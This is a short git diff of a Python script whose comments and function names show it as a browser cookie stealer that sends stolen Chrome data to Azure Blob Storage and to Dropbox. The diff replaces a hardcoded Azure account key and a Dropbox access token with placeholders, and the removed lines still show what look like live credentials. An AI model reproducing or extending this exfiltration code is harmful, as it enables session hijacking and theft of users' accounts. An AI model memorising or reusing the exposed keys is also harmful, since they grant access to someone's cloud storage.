@@ -114,7 +114,7 @@ def get_firefox_cookies():
 # Function to exfiltrate Chrome cookies data to Azure Blob Storage
 def exfil():
     cookies = get_chrome_cookies()
-    connection_string = "DefaultEndpointsProtocol=https;AccountName=ops10101;AccountKey=I35Mk/My6QLuP86/xBhsi/2IQCvgO4Lh4bj5rjUAoW5drKHsXBpeFtm19x4i8mD0WKCE+LkbQFAH+AStx0oOog==;EndpointSuffix=core.windows.net"
+    connection_string = "<place-holder-for-token>"
     container_name = "test324"
 
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -253,7 +253,7 @@ if __name__ == '__main__':
     CONST_IV = 'qwertyuiopasdfgh'.encode()
 
     # Dropbox token
-    token = "sl.B0BuwBjKcL3pK1a6nvJOYK7hHaF6L3zLNn281Yltix-SETmuSn2w12zacDe7N9WU61gU_2ZHJoscUzt05uWPECwf-Yv9c0nsDOHDcetXs-Vajldysyw0B8AZn5Uj_hdFcMLMhG0_z7llIofZCvl9"
+    token = "<place-holder-for-token>"
 
     dbx = dropbox.Dropbox(token)
     
